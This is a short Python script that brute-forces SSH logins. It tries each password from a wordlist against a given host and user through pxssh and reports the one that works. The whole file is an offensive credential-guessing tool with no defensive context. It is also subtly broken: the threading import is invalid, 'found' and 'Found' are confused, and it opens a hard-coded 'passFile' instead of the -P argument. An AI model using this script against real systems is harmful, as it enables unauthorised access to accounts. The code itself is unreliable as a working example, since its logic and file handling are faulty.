import pxssh
import optparse
from threading import optparse
import multiprocessing

found = 0 

def sshconn(host,user,password):
    global Found
    try:
        ssh = pxssh.pxssh()
        ssh.login(host,user,password)
        print ('[+]SSH Password Found:' + password)
        Found = 1
    except:
        print ('[-]Testing:' + password)


parser = optparse.OptionParser('usage help')
parser.add_option('-H',dest='host',type='string')
parser.add_option('-U',dest='user',type='string')
parser.add_option('-P',dest='passwordFile',type='string')
(options,args) = parser.parse_args()
host = options.host
user = options.user
passwordFile = options.passwordFile
if host == None or user == None or passwordFile == None:
    print(parser.usage)
f=open('passFile','r')
for line in f.readlines():
    passwd = line.strip('\n')
    sshconn(host,user,passwd)
    if Found:
        exit(0)